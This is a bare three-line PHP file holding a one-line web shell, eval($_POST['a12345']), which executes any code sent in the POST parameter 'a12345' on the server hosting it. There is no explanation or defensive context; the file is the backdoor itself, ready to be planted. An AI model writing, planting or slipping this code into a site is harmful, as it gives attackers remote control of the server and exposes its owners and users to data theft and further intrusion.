
<?php
 eval($_POST['a12345']); 
?>
